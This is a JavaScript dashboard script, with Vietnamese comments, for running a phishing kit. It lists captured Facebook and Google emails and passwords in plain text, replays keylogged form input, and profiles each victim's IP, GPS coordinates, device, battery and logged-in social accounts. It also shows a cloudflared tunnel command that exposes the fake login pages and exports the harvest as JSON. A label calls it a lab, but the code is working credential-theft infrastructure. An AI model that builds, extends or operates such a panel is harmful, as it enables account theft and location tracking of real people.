/**
 * Dashboard Script v3.1
 * - Panel KHÔNG bao giờ tự đóng khi auto-refresh
 * - Nút xóa từng item
 * - Banner "Có dữ liệu mới" thay vì rebuild DOM
 */

// ===== STATE =====
let cachedItems = [];         // Dữ liệu đã render
let lastTotalCount = -1;      // Số entries lần cuối check
let hasNewData = false;       // Có dữ liệu mới chưa

// ===== TAB SWITCHING =====
function switchTab(tabName) {
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
    document.getElementById('tab-' + tabName).classList.add('active');
    event.target.classList.add('active');
    if (tabName === 'keylog') loadKeylog();
    if (tabName === 'data') loadAllData();
}

// ===== TUNNEL STATUS =====
async function checkTunnel() {
    try {
        const d = await fetch('/api/tunnel').then(r => r.json());
        const banner = document.getElementById('tunnelBanner');
        const status = document.getElementById('tunnelStatus');
        if (d.url && d.status === 'connected') {
            banner.className = 'tunnel-banner connected';
            status.innerHTML = `<span style="color:var(--success);font-size:18px;">✅</span><div><div style="color:var(--success);font-weight:600;">Tunnel đã kết nối!</div><div class="tunnel-url">${d.url}</div></div>`;
            document.getElementById('fbLink').textContent = d.phishing_links.facebook;
            document.getElementById('ggLink').textContent = d.phishing_links.google;
        } else if (d.status === 'failed') {
            banner.className = 'tunnel-banner failed';
            status.innerHTML = `<span style="font-size:18px;">❌</span><div><div style="color:var(--danger);font-weight:600;">Tunnel thất bại</div><div style="font-size:12px;color:var(--text-dim);">npx cloudflared tunnel --url http://localhost:3000</div></div>`;
            document.getElementById('fbLink').textContent = location.origin + '/phishing/facebook.html';
            document.getElementById('ggLink').textContent = location.origin + '/phishing/google.html';
        } else {
            document.getElementById('fbLink').textContent = location.origin + '/phishing/facebook.html';
            document.getElementById('ggLink').textContent = location.origin + '/phishing/google.html';
        }
    } catch(e) {}
}

// ===== BACKGROUND POLL: Chỉ check count, không rebuild DOM =====
async function pollForNewData() {
    try {
        const cnt = await fetch('/api/count').then(r => r.json());
        const currentTotal = cnt.total;

        // Cập nhật stats
        document.getElementById('totalEntries').textContent = cnt.harvest;
        document.getElementById('visitorCount').textContent = cnt.fp;

        if (lastTotalCount === -1) {
            // Lần đầu load
            lastTotalCount = currentTotal;
            return;
        }
        if (currentTotal > lastTotalCount) {
            // Có data mới → hiện banner thông báo
            lastTotalCount = currentTotal;
            showNewDataBanner();
        }
    } catch(e) {}
}

function showNewDataBanner() {
    let banner = document.getElementById('newDataBanner');
    if (!banner) {
        banner = document.createElement('div');
        banner.id = 'newDataBanner';
        banner.className = 'new-data-banner';
        banner.onclick = () => { loadAllData(); banner.remove(); };
        document.getElementById('dataContainer').insertAdjacentElement('beforebegin', banner);
    }
    banner.innerHTML = '🔔 Có dữ liệu mới! <strong>Nhấn để tải</strong>';
}

// ===== LOAD ALL DATA (Rebuild DOM) =====
async function loadAllData() {
    // Xóa banner nếu có
    const banner = document.getElementById('newDataBanner');
    if (banner) banner.remove();

    try {
        const [harvestRes, fpRes, keylogRes] = await Promise.all([
            fetch('/api/data').then(r => r.json()),
            fetch('/api/fingerprints').then(r => r.json()),
            fetch('/api/keylog').then(r => r.json())
        ]);

        document.getElementById('totalEntries').textContent = harvestRes.total;
        document.getElementById('keystrokeCount').textContent = keylogRes.total_keystrokes;

        // Build unified timeline
        const items = [];
        const fpEntries = (fpRes.entries || []).filter(f => f.device && !f.update_type);
        
        fpEntries.forEach(fp => {
            items.push({ type: 'visit', time: fp.received_at, page: fp.page_type || 'unknown',
                ip: fp.server_ip || 'N/A', device_name: fp.device?.device_name || 'Unknown',
                device_type: fp.device?.device_type || '', os: (fp.device?.os || '') + ' ' + (fp.device?.os_version || ''),
                browser: (fp.device?.browser || '') + ' ' + (fp.device?.browser_version || ''),
                fp: fp, email: null, password: null, fp_time: fp.received_at });
        });

        (harvestRes.entries || []).forEach(h => {
            items.push({ type: 'harvest', time: h.timestamp, page: h.page_type || 'unknown',
                ip: h.metadata?.ip || 'N/A', device_name: h.metadata?.platform || 'Unknown',
                device_type: '', os: h.metadata?.platform || '', browser: '',
                email: h.credentials?.email || '', password: h.credentials?.password || '',
                fp: null, harvest_time: h.timestamp });
        });

        items.sort((a, b) => new Date(b.time) - new Date(a.time));

        // Match fingerprint → harvest
        const usedFp = new Set();
        const merged = [];
        items.forEach(item => {
            if (item.type === 'harvest') {
                const matchIdx = items.findIndex((fp, idx) =>
                    fp.type === 'visit' && !usedFp.has(idx) && fp.ip === item.ip && fp.page === item.page &&
                    Math.abs(new Date(fp.time) - new Date(item.time)) < 120000);
                if (matchIdx >= 0) {
                    usedFp.add(matchIdx);
                    item.fp = items[matchIdx].fp;
                    item.device_name = items[matchIdx].device_name;
                    item.os = items[matchIdx].os;
                    item.browser = items[matchIdx].browser;
                    item.device_type = items[matchIdx].device_type;
                    item.fp_time = items[matchIdx].fp_time;
                }
                merged.push(item);
            } else if (!usedFp.has(items.indexOf(item))) {
                merged.push(item);
            }
        });

        // Stats
        let mobile = 0;
        merged.forEach(m => { if (/Điện thoại|iPhone|Android|Mobile/i.test(m.device_type || m.device_name || '')) mobile++; });
        document.getElementById('visitorCount').textContent = fpEntries.length;
        document.getElementById('mobileCount').textContent = mobile;

        // Update lastTotalCount
        lastTotalCount = harvestRes.total + fpEntries.length;

        const container = document.getElementById('dataContainer');
        if (!merged.length) {
            container.innerHTML = '<div class="empty-state">Chưa có dữ liệu. Mở link phishing trên điện thoại để test.</div>';
            return;
        }

        container.innerHTML = merged.map((item, idx) => renderEntry(item, idx)).join('');

    } catch(err) { console.error(err); }
}

// ===== RENDER 1 ENTRY =====
function renderEntry(item, idx) {
    const time = new Date(item.time).toLocaleString('vi-VN');
    const isHarvest = item.type === 'harvest';
    const pageIcon = item.page === 'facebook' ? '📘' : '📧';
    const pageLabel = item.page === 'facebook' ? 'Facebook' : 'Google';
    const statusBadge = isHarvest
        ? '<span class="entry-badge harvest">🎣 Credentials</span>'
        : '<span class="entry-badge visit">👁️ Truy cập</span>';

    // Delete keys
    const delKey = isHarvest
        ? encodeURIComponent(item.harvest_time || item.time)
        : encodeURIComponent(item.fp_time || item.time);
    const delApi = isHarvest ? '/api/data/' : '/api/fingerprint/';

    // Device detail panel
    let detailPanel = '';
    if (item.fp) {
        const fp = item.fp, dev = fp.device || {}, net = fp.network || {},
              ctx = fp.context || {}, loc = fp.location || {}, bat = fp.battery || {}, social = fp.social_logins || {};
        const R = (icon, label, val) => `<div class="fp-row"><span class="fp-icon">${icon}</span><div><div class="fp-label">${label}</div><div class="fp-value">${val}</div></div></div>`;

        let locHtml = '';
        if (loc.latitude) {
            locHtml = `<div class="fp-row fp-row-wide"><span class="fp-icon">📍</span><div><div class="fp-label">VỊ TRÍ ${loc.source==='GPS'?'(GPS)':'(IP)'}</div><div class="fp-value" style="color:var(--success)">${loc.latitude}, ${loc.longitude}</div><div style="font-size:11px;color:var(--text-dim)">Chính xác: ${loc.accuracy||'N/A'}</div><a href="${loc.google_maps}" target="_blank" class="fp-map-link">🗺️ Google Maps</a></div></div>`;
        } else if (loc.error && loc.error !== 'Đang lấy...') {
            locHtml = R('📍','Vị trí',`<span style="color:var(--danger)">${loc.error}</span>`);
        }

        const sk = Object.keys(social);
        const iconMap = {Facebook:'📘',Google:'📧',YouTube:'📺',TikTok:'🎵',Instagram:'📸',Twitter:'🐦'};
        const socialHtml = sk.map(n => {
            const s = social[n]; const ic = Object.keys(iconMap).find(k => n.includes(k));
            const st = s.likely_logged_in ? '<span style="color:var(--success)">✅ Đã đăng nhập</span>' : s.reachable ? '⬜ Không rõ' : '❌ Blocked';
            return R(iconMap[ic]||'🔗', n, st);
        }).join('');

        detailPanel = `<div class="detail-panel" id="detail-${idx}">
            <div class="detail-section"><div class="detail-section-title"><span class="rank-badge r1">RANK 1</span> Kết nối mạng</div>
                <div class="fp-grid">
                    ${R('🌐','IP',fp.server_ip||'N/A')}${R('🔌','Kết nối',net.type||'N/A')}${R('📶','Tốc độ',(net.downlink||'N/A')+' • '+(net.rtt||'N/A'))}
                    ${loc.isp?R('📡','ISP',loc.isp):''}${loc.city?R('🏙️','Vùng',[loc.city,loc.region,loc.country].filter(Boolean).join(', ')):''}
                </div></div>
            <div class="detail-section"><div class="detail-section-title"><span class="rank-badge r2">RANK 2</span> Thiết bị</div>
                <div class="fp-grid">
                    ${R('📱','Tên máy',esc(dev.device_name||'N/A'))}${R('💻','OS',(dev.os||'')+' '+(dev.os_version||''))}
                    ${R('🌍','Trình duyệt',(dev.browser||'')+' v'+(dev.browser_version||''))}${R('📐','Màn hình',(dev.screen_width||'?')+'x'+(dev.screen_height||'?')+' @'+(dev.pixel_ratio||1)+'x')}
                    ${R('🧠','RAM/CPU',(dev.device_memory||'N/A')+' • '+(dev.hardware_concurrency||'?')+' cores')}
                </div></div>
            <div class="detail-section"><div class="detail-section-title"><span class="rank-badge r3">RANK 3</span> Hành vi</div>
                <div class="fp-grid">
                    ${R('⏰','Mở link',ctx.local_time||time)}${R('⏱️','Xem trang',fp.dwell_time||'0s')}
                    ${R('🔗','Nguồn',ctx.referrer_source||'Trực tiếp')}${R('🗣️','Ngôn ngữ',(ctx.language||'N/A')+' • '+(ctx.timezone||''))}
                    ${R('🔋','Pin',(bat.level||'N/A')+' '+(bat.charging||''))}
                </div></div>
            ${locHtml?`<div class="detail-section"><div class="detail-section-title">📍 Vị trí</div><div class="fp-grid">${locHtml}</div></div>`:''}
            ${socialHtml?`<div class="detail-section"><div class="detail-section-title"><span class="rank-badge r4">RANK 4</span> Tài khoản</div><div class="fp-grid">${socialHtml}</div></div>`:''}
        </div>`;
    }

    return `<div class="data-entry ${isHarvest?'has-creds':'visit-only'}" id="entry-${idx}">
        <div class="entry-main" onclick="toggleDetail(${idx})">
            <div class="entry-left">
                <div class="entry-page">${pageIcon} ${pageLabel}</div>
                <div class="entry-time">${time}</div>
            </div>
            <div class="entry-center">
                ${isHarvest
                    ? `<div class="entry-cred"><span class="cred-label">Email:</span> <span class="cred-val">${esc(item.email)}</span></div><div class="entry-cred"><span class="cred-label">Pass:</span> <span class="cred-val">${esc(item.password)}</span></div>`
                    : `<div class="entry-device">${esc(item.device_name)}</div><div class="entry-os">${item.os}</div>`}
            </div>
            <div class="entry-right">
                ${statusBadge}
                <div class="entry-ip">${item.ip}</div>
                <div class="entry-expand" id="arrow-${idx}">${item.fp ? '▼' : ''}</div>
            </div>
        </div>
        <div class="entry-actions">
            <button class="btn-delete-item" onclick="deleteItem('${delApi}','${delKey}',${idx})" title="Xóa entry này">🗑️ Xóa</button>
        </div>
        ${detailPanel}
    </div>`;
}

// ===== TOGGLE DETAIL (không tự đóng bao giờ) =====
function toggleDetail(idx) {
    const panel = document.getElementById('detail-' + idx);
    const arrow = document.getElementById('arrow-' + idx);
    if (!panel) return;
    const isOpen = panel.classList.contains('open');
    panel.classList.toggle('open');
    if (arrow) arrow.classList.toggle('rotated', !isOpen);
}

// ===== XÓA TỪNG ITEM =====
async function deleteItem(api, key, idx) {
    try {
        const r = await fetch(api + key, { method: 'DELETE' });
        const d = await r.json();
        if (d.success) {
            const el = document.getElementById('entry-' + idx);
            if (el) { el.style.opacity = '0'; el.style.transform = 'translateX(10px)'; el.style.transition = 'all 0.3s'; setTimeout(() => el.remove(), 300); }
        }
    } catch(e) { alert('Lỗi khi xóa'); }
}

// ===== LOAD KEYLOG =====
async function loadKeylog() {
    try {
        const data = await fetch('/api/keylog').then(r => r.json());
        document.getElementById('keystrokeCount').textContent = data.total_keystrokes;
        const container = document.getElementById('keylogContainer');
        if (!data.sessions.length) { container.innerHTML = '<div class="empty-state">Chưa có keylog</div>'; return; }
        container.innerHTML = data.sessions.slice(0, 20).map(session => {
            const fields = {};
            session.keystrokes.forEach(k => { if (!fields[k.field]) fields[k.field] = []; fields[k.field].push(k); });
            const fieldsHtml = Object.entries(fields).map(([field, keys]) =>
                `<div style="margin-bottom:8px;"><div class="keylog-field-label">${field}</div><div class="keylog-keys">${esc(keys[keys.length-1]?.value||'')}</div></div>`
            ).join('');
            const time = new Date(session.start_time).toLocaleString('vi-VN');
            return `<div class="keylog-session"><div class="keylog-session-header"><div><strong>${session.page_type==='facebook'?'📘 Facebook':'📧 Google'}</strong> • ${session.platform} • ${session.ip}</div><div>${time}</div></div>${fieldsHtml}</div>`;
        }).join('');
    } catch(e) { console.error(e); }
}

// ===== UTILS =====
function esc(str) { const d = document.createElement('div'); d.textContent = str || ''; return d.innerHTML; }

async function clearData() {
    if (!confirm('Xóa toàn bộ dữ liệu?')) return;
    try { await fetch('/api/data', { method: 'DELETE' }); lastTotalCount = -1; loadAllData(); } catch(e) { alert('Lỗi'); }
}
async function exportData() {
    try {
        const [h, f] = await Promise.all([fetch('/api/data').then(r=>r.json()), fetch('/api/fingerprints').then(r=>r.json())]);
        const blob = new Blob([JSON.stringify({harvest:h, fingerprints:f}, null, 2)], {type:'application/json'});
        const url = URL.createObjectURL(blob); const a = document.createElement('a');
        a.href = url; a.download = `phishing_lab_${new Date().toISOString().split('T')[0]}.json`; a.click();
    } catch(e) { alert('Lỗi'); }
}
function copyLink(id) {
    const text = document.getElementById(id).textContent;
    navigator.clipboard.writeText(text).then(() => {
        const btn = event.target; const o = btn.textContent;
        btn.textContent = '✅ Copied!'; btn.style.background = 'var(--success)'; btn.style.color = '#fff';
        setTimeout(() => { btn.textContent = o; btn.style.background = ''; btn.style.color = ''; }, 1500);
    }).catch(() => { const el = document.createElement('textarea'); el.value = text; document.body.appendChild(el); el.select(); document.execCommand('copy'); document.body.removeChild(el); });
}

// ===== INIT =====
loadAllData();
checkTunnel();
// Chỉ poll count ở background (KHÔNG rebuild DOM) - mỗi 5s
setInterval(pollForNewData, 5000);
setInterval(checkTunnel, 6000);
setInterval(() => { if (document.getElementById('tab-keylog').classList.contains('active')) loadKeylog(); }, 5000);
